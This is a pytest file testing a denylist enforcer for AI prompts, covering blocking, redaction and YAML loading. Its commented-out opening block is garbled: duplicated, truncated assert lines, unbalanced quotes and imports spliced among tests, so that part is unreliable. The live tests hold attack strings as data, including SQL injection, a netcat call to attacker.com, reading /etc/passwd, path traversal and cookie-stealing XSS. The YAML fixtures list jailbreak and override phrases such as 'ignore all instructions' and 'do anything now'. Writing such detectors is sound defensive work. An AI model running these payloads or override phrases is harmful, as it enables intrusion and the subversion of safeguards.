#         assert enforcer.is_prompt_allowed("Enter pass, "enf is not valid"
# 
#     def test_no_redaction_needed(self):
# This module provides exhaustive testing of the denylist enforcement system,
#         """Test text that doesn't need redaction."""
#         patterns = [
#             (re.compile(r"\d{16}"), "[CARD]"),
#         ]
# 
#         assert enforcer.is_prompt_allowed("Use api@key for access") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("Enter pass, "enf is not valid"
# import re
#         assert enforcer.is_prompt_allowed("Use api@key for access") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("Enter pass, "enf is not valid"
# 
#         assert enforcer.is_prompt_allowed("Use api@key for access") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("Enter pass, "enf is not valid"
# try:
#     from codex_ml.security.denylist import (
#         DenylistEnforcer,
#         DenylistRules,
#         DenylistViolation,
#         load_denylist,
#     )
# 
#     DENYLIST_AVAILABLE = True
#         assert enforcer.is_prompt_allowed("Use api@key for access") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("Enter pass, "enf is not valid"
# 
#         assert enforcer.is_prompt_allowed("Use api@key for access") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("Enter pass, "enf is not valid"
#     not DENYLIST_AVAILABLE, reason="codex_ml.security.denylist not available"
# )
#         assert enforcer.is_prompt_allowed("Use api@key for access") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("Enter pass, "enf is not valid"
# # =============================================================================
# # Advanced Pattern Matching Tests
# # =============================================================================
#         assert enforcer.is_prompt_allowed("Use api@key for access") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("Enter pass, "enf is not valid"
# class TestAdvancedPatternMatching:
# class TestAdvancedPatternMatching:
#     """Advanced pattern matching and detection tests."""
#     def test_case_insensitive_matching(self):
#     def test_case_insensitive_matching(self):
#         """Test case-insensitive sensitive term matching."""
#         rules = DenylistRules(
#             sensitive_terms=["password", "secret"],
#             redaction_patterns=[],
#             blocked_actions=[],
#             blocked_prompt_patterns=[],
#         )
#         enforcer = DenylistEnforcer(rules)
#         assert enforcer.is_prompt_allowed("PASSWORD") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("PaSsWoRd") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("password") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("My password is secret") is False, "password is not valid"
#         assert enforcer.is_prompt_allowed("My password is secret") is False, "password is not valid"
# 
#     def test_partial_word_matching(self):
#     def test_partial_word_matching(self):
#         """Test that sensitive terms match within words."""
#         rules = DenylistRules(
#             sensitive_terms=["secret"],
#             redaction_patterns=[],
#             blocked_actions=[],
#             blocked_prompt_patterns=[],
#         )
#         enforcer = DenylistEnforcer(rules)
#         assert enforcer.is_prompt_allowed("The secretive plan") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("secretariat") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("secretariat") is False, "enf is not valid"
# 
#     def test_multiple_sensitive_terms_detection(self):
#     def test_multiple_sensitive_terms_detection(self):
#         """Test detection when multiple terms are present."""
#         rules = DenylistRules(
#             sensitive_terms=["api_key", "token", "credentials"],
#             redaction_patterns=[],
#             blocked_actions=[],
#             blocked_prompt_patterns=[],
#         )
#         enforcer = DenylistEnforcer(rules)
#         prompt = "Send api_key and token with credentials"
#         assert enforcer.is_prompt_allowed(prompt) is False, "enf is not valid"
# 
#     def test_blocked_pattern_regex_like(self):
#     def test_blocked_pattern_regex_like(self):
#         """Test blocked patterns are matched as substrings."""
#         rules = DenylistRules(
#             sensitive_terms=[],
#             redaction_patterns=[],
#             blocked_actions=[],
#             blocked_prompt_patterns=["delete", "drop table"],
#         )
#         enforcer = DenylistEnforcer(rules)
#         assert enforcer.is_prompt_allowed("Please delete the file") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("drop table users") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("drop table users") is False, "enf is not valid"
# 
#     def test_whitespace_variations(self):
#     def test_whitespace_variations(self):
#         """Test handling of various whitespace characters."""
#         rules = DenylistRules(
#             sensitive_terms=["sensitive"],
#             redaction_patterns=[],
#             blocked_actions=[],
#             blocked_prompt_patterns=[],
#         )
#         enforcer = DenylistEnforcer(rules)
#         assert enforcer.is_prompt_allowed("sensitive data") is False, "Data must not be empty"
#         assert enforcer.is_prompt_allowed("sensitive  information") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("sensitive\tinformation") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("sensitive\tinformation") is False, "enf is not valid"
# 
#     def test_special_characters_in_terms(self):
#     def test_special_characters_in_terms(self):
#         """Test sensitive terms with special characters."""
#         rules = DenylistRules(
#             sensitive_terms=["$secret", "api@key", "pass#word"],
#             redaction_patterns=[],
#             blocked_actions=[],
#             blocked_prompt_patterns=[],
#         )
#         enforcer = DenylistEnforcer(rules)
#         assert enforcer.is_prompt_allowed("The $secret is here") is False, "secret is not valid"
#         assert enforcer.is_prompt_allowed("Use api@key for access") is False, "enf is not valid"
#         assert enforcer.is_prompt_allowed("Enter pass#word") is False, "pass is not valid"
# 
#     def test_empty_string_prompt(self):
#     def test_empty_string_prompt(self):
#         """Test handling of empty string prompt."""
#         rules = DenylistRules(
#             sensitive_terms=["secret"],
#             redaction_patterns=[],
#             blocked_actions=[],
#             blocked_prompt_patterns=[],
#         )
#         enforcer = DenylistEnforcer(rules)
#         assert enforcer.is_prompt_allowed("") is True, "enf is not valid"
# 
#     def test_very_long_prompt_performance(self):
#     def test_very_long_prompt_performance(self):
#         """Test performance with very long prompts."""
#         rules = DenylistRules(
#             sensitive_terms=["secret"],
#             redaction_patterns=[],
#             blocked_actions=[],
#             blocked_prompt_patterns=[],
#         )
#         enforcer = DenylistEnforcer(rules)
#         long_prompt = "safe " * 200000
#         assert enforcer.is_prompt_allowed(long_prompt) is True, "enf is not valid"
# 
#         # With secret at the end
#         long_prompt_with_secret = long_prompt + " secret"
#         assert enforcer.is_prompt_allowed(long_prompt_with_secret) is False, "enf is not valid"


# =============================================================================
# Advanced Redaction Tests
# =============================================================================


class TestAdvancedRedaction:
    """Advanced redaction pattern tests."""

    def test_multiple_redaction_patterns(self):
        """Test applying multiple redaction patterns."""
        patterns = [
            (re.compile(r"\b\d{16}\b"), "[CREDIT_CARD]"),
            (re.compile(r"\b\d{3}-\d{2}-\d{4}\b"), "[SSN]"),
            (re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}"), "[EMAIL]"),
        ]

        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        text = "Card: 1234567890123456, SSN: 123-45-6789, Email: user@example.com"
        redacted = enforcer.redact(text)

        assert "1234567890123456" not in redacted, "Condition must be true"
        assert "123-45-6789" not in redacted, "Condition must be true"
        assert "user@example.com" not in redacted, "Condition must be true"
        assert "[CREDIT_CARD]" in redacted, "Condition must be true"
        assert "[SSN]" in redacted, "Condition must be true"
        assert "[EMAIL]" in redacted, "Condition must be true"

    def test_redaction_preserves_structure(self):
        """Test that redaction preserves text structure."""
        patterns = [(re.compile(r"\d{4}"), "[XXXX]")]

        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        text = "Line 1: Code 1234\nLine 2: Normal text\nLine 3: Code 5678"
        redacted = enforcer.redact(text)

        assert "Line 1:" in redacted, "Condition must be true"
        assert "Line 2: Normal text" in redacted, "Condition must be true"
        assert "\n" in redacted, "Condition must be true"
        assert "1234" not in redacted, "Condition must be true"
        assert "5678" not in redacted, "Condition must be true"

    def test_overlapping_redaction_patterns(self):
        """Test handling of overlapping patterns."""
        patterns = [
            (re.compile(r"\d+"), "[NUM]"),
            (re.compile(r"\d{4}"), "[YEAR]"),
        ]

        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        text = "Year: 2024"
        redacted = enforcer.redact(text)

        # First pattern should match
        assert "2024" not in redacted, "Condition must be true"
        assert "[NUM]" in redacted, "Condition must be true"

    def test_redaction_with_groups(self):
        """Test redaction patterns with capture groups."""
        patterns = [
            (re.compile(r"(\d{3})-(\d{2})-(\d{4})"), r"XXX-XX-XXXX"),
        ]

        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        text = "SSN: 123-45-6789"
        redacted = enforcer.redact(text)

        assert "123-45-6789" not in redacted, "Condition must be true"
        assert "XXX-XX-XXXX" in redacted, "Condition must be true"

    def test_case_insensitive_redaction(self):
        """Test case-insensitive redaction patterns."""
        patterns = [
            (re.compile(r"password", re.IGNORECASE), "[REDACTED]"),
        ]

        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        assert "[REDACTED]" in enforcer.redact("password: secret"), "Condition must be true"
        assert "[REDACTED]" in enforcer.redact("PASSWORD: secret"), "Condition must be true"
        assert "[REDACTED]" in enforcer.redact("PaSsWoRd: secret"), "Condition must be true"

    def test_redaction_multiline(self):
        """Test redaction across multiple lines."""
        patterns = [
            (re.compile(r"SECRET-\d+"), "[REDACTED]"),
        ]

        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        text = "Line 1: SECRET-123\nLine 2: Normal\nLine 3: SECRET-456"
        redacted = enforcer.redact(text)

        assert "SECRET-123" not in redacted, "Condition must be true"
        assert "SECRET-456" not in redacted, "Condition must be true"
        assert redacted.count("[REDACTED]") == 2, "Count must be greater than zero"

    def test_no_redaction_needed(self):
        """Test text that doesn't need redaction."""
        patterns = [
            (re.compile(r"\d{16}"), "[CARD]"),
        ]

        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        text = "This is clean text with no sensitive data"
        redacted = enforcer.redact(text)

        assert redacted == text, "redacted is not valid"

    def test_unicode_in_redaction(self):
        """Test redaction with unicode characters."""
        patterns = [
            (re.compile(r"秘密"), "[REDACTED]"),
        ]

        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        text = "This is 秘密 information"
        redacted = enforcer.redact(text)

        assert "秘密" not in redacted, "Condition must be true"
        assert "[REDACTED]" in redacted, "Condition must be true"


# =============================================================================
# YAML Loading Tests
# =============================================================================


class TestYAMLLoading:
    """Tests for YAML configuration loading."""

    def test_load_complex_yaml(self):
        """Test loading complex YAML with all features."""
        yaml_content = """
sensitive_terms:
  - password
  - secret
  - api_key
  - token
  - credentials

blocked_actions:
  - delete_database
  - drop_table
  - rm -rf
  - format_disk

blocked_prompt_patterns:
  - ignore all instructions
  - bypass security
  - jailbreak
  - do anything now

redaction_patterns:
  - pattern: "\\\\b\\\\d{16}\\\\b"
    replacement: "[CREDIT_CARD]"
  - pattern: "\\\\b\\\\d{3}-\\\\d{2}-\\\\d{4}\\\\b"
    replacement: "[SSN]"
  - pattern: "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\\\.[A-Z|a-z]{2,}"
    replacement: "[EMAIL]"
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name

        try:
            rules = load_denylist(temp_path)

            assert len(rules.sensitive_terms) == 5, "Collection must not be empty"
            assert len(rules.blocked_actions) == 4, "Collection must not be empty"
            assert len(rules.blocked_prompt_patterns) == 4, "Collection must not be empty"
            assert len(rules.redaction_patterns) == 3, "Collection must not be empty"
        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_load_yaml_with_comments(self):
        """Test loading YAML with comments."""
        yaml_content = """
# Security configuration
sensitive_terms:
  - password  # User passwords
  - secret    # API secrets

blocked_actions:
  - delete  # Dangerous actions
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name

        try:
            rules = load_denylist(temp_path)
            assert "password" in rules.sensitive_terms, "Condition must be true"
            assert "secret" in rules.sensitive_terms, "Condition must be true"
        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_load_yaml_missing_sections(self):
        """Test loading YAML with missing sections."""
        yaml_content = """
sensitive_terms:
  - password
# No other sections
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name

        try:
            rules = load_denylist(temp_path)
            assert len(rules.sensitive_terms) > 0, "Collection must not be empty"
            assert len(rules.blocked_actions) == 0, "Collection must not be empty"
            assert len(rules.blocked_prompt_patterns) == 0, "Collection must not be empty"
        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_load_yaml_with_unicode(self):
        """Test loading YAML with unicode content."""
        yaml_content = """
sensitive_terms:
  - password
  - パスワード
  - 密码
  - пароль

blocked_actions:
  - 削除
  - удалить
"""

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".yaml", delete=False, encoding="utf-8"
        ) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name

        try:
            rules = load_denylist(temp_path)
            assert "パスワード" in rules.sensitive_terms, "Condition must be true"
            assert "密码" in rules.sensitive_terms, "Condition must be true"
        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_load_yaml_invalid_pattern(self):
        """Test handling of invalid regex patterns."""
        yaml_content = """
redaction_patterns:
  - pattern: "\\\\d{4}"
    replacement: "[VALID]"
sensitive_terms:
  - password
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name

        try:
            # Should load successfully
            rules = load_denylist(temp_path)
            # The valid pattern should be loaded
            assert len(rules.redaction_patterns) >= 1, "Collection must not be empty"
            assert "password" in rules.sensitive_terms, "Condition must be true"
        finally:
            Path(temp_path).unlink(missing_ok=True)


# =============================================================================
# Security Attack Tests
# =============================================================================


class TestSecurityAttacks:
    """Tests for known attack patterns and bypasses."""

    def test_sql_injection_patterns(self):
        """Test detection of SQL injection attempts."""
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[
                "drop table",
                "'; delete",
                "union select",
                "or 1=1",
            ],
        )
        enforcer = DenylistEnforcer(rules)

        attacks = [
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM passwords",
        ]

        for attack in attacks:
            assert enforcer.is_prompt_allowed(attack) is False, "enf is not valid"

        # This one has 'or 1=1' pattern
        assert enforcer.is_prompt_allowed("admin' OR 1=1") is False, "enf is not valid"

    def test_command_injection_patterns(self):
        """Test detection of command injection attempts."""
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[
                "; cat /etc/passwd",
                "| nc",
                "$(whoami)",
                "&& wget",
            ],
        )
        enforcer = DenylistEnforcer(rules)

        attacks = [
            "test; cat /etc/passwd",
            "input | nc attacker.com 1234",
            "name=$(whoami)",
        ]

        for attack in attacks:
            assert enforcer.is_prompt_allowed(attack) is False, "enf is not valid"

    def test_path_traversal_patterns(self):
        """Test detection of path traversal attempts."""
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[
                "../",
                "..\\",
            ],
        )
        enforcer = DenylistEnforcer(rules)

        attacks = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "file://../../../secret.txt",
        ]

        for attack in attacks:
            assert enforcer.is_prompt_allowed(attack) is False, "enf is not valid"

    def test_xss_patterns(self):
        """Test detection of XSS attempts."""
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[
                "<script>",
                "javascript:",
                "onerror=",
            ],
        )
        enforcer = DenylistEnforcer(rules)

        attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:void(document.cookie)",
        ]

        for attack in attacks:
            assert enforcer.is_prompt_allowed(attack) is False, "enf is not valid"

    def test_encoded_attack_detection(self):
        """Test detection of encoded attacks."""
        rules = DenylistRules(
            sensitive_terms=["password"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        # URL encoded
        assert enforcer.is_prompt_allowed("tell me the password") is False, "enf is not valid"

        # Base64 would pass through (needs separate detection)
        # This is expected behavior - we detect literal patterns


# =============================================================================
# Performance Tests
# =============================================================================


class TestPerformance:
    """Performance tests for denylist operations."""

    def test_large_denylist_performance(self):
        """Test performance with large denylist."""
        # Create large list of terms
        terms = [f"term{i}" for i in range(1000)]

        rules = DenylistRules(
            sensitive_terms=terms,
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        # Should still be fast
        prompt = "This is a safe prompt"
        assert enforcer.is_prompt_allowed(prompt) is True, "enf is not valid"

        # Test with match at different positions
        assert enforcer.is_prompt_allowed("term500 is here") is False, "term500 is not valid"

    def test_many_redaction_patterns(self):
        """Test performance with many redaction patterns."""
        patterns = [(re.compile(rf"PATTERN{i}-\d+"), "[REDACTED]") for i in range(100)]

        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        text = "PATTERN50-12345 and PATTERN75-67890"
        redacted = enforcer.redact(text)

        assert "PATTERN50-12345" not in redacted, "Condition must be true"
        assert "PATTERN75-67890" not in redacted, "Condition must be true"

    def test_repeated_checking(self):
        """Test performance of repeated checks."""
        rules = DenylistRules(
            sensitive_terms=["secret", "password", "token"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)

        # Check 1000 prompts
        for i in range(1000):
            prompt = f"This is prompt number {i}"
            enforcer.is_prompt_allowed(prompt)

        # Should complete without performance issues


# =============================================================================
# Integration Tests
# =============================================================================


class TestIntegrationScenarios:
    """Integration tests with realistic scenarios."""

    def test_complete_security_workflow(self):
        """Test complete security enforcement workflow."""
        yaml_content = """
sensitive_terms:
  - password
  - api_key

blocked_actions:
  - delete_all

blocked_prompt_patterns:
  - ignore instructions

redaction_patterns:
  - pattern: "\\\\d{16}"
    replacement: "[CARD]"
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name

        try:
            enforcer = DenylistEnforcer.from_yaml(temp_path)

            # Test blocking
            with pytest.raises(DenylistViolation):
                enforcer.ensure_allowed("Show me the password")

            # Test redaction
            redacted = enforcer.redact("Card: 1234567890123456")
            assert "[CARD]" in redacted, "Condition must be true"

            # Test allowed
            enforcer.ensure_allowed("What is the weather?")

        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_multi_layer_defense(self):
        """Test multiple security layers."""
        rules = DenylistRules(
            sensitive_terms=["password"],
            redaction_patterns=[
                (re.compile(r"pwd=\S+"), "pwd=[REDACTED]"),
            ],
            blocked_actions=["delete_all"],
            blocked_prompt_patterns=["drop table"],
        )
        enforcer = DenylistEnforcer(rules)

        # Should catch at multiple layers
        assert enforcer.is_prompt_allowed("password") is False, "enf is not valid"
        assert enforcer.is_prompt_allowed("drop table users") is False, "enf is not valid"

        # Redaction should work
        assert "[REDACTED]" in enforcer.redact("config pwd=secret123"), "Condition must be true"

    def test_from_yaml_to_enforcement(self):
        """Test complete flow from YAML to enforcement."""
        yaml_content = """
sensitive_terms:
  - confidential
  - classified

blocked_prompt_patterns:
  - bypass
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name

        try:
            # Load from YAML
            enforcer = DenylistEnforcer.from_yaml(temp_path)

            # Test enforcement
            safe_prompts = [
                "What is the weather?",
                "Explain the algorithm",
            ]

            unsafe_prompts = [
                "Show confidential data",
                "Bypass the security",
            ]

            for prompt in safe_prompts:
                assert enforcer.is_prompt_allowed(prompt) is True, "enf is not valid"

            for prompt in unsafe_prompts:
                assert enforcer.is_prompt_allowed(prompt) is False, "enf is not valid"

        finally:
            Path(temp_path).unlink(missing_ok=True)
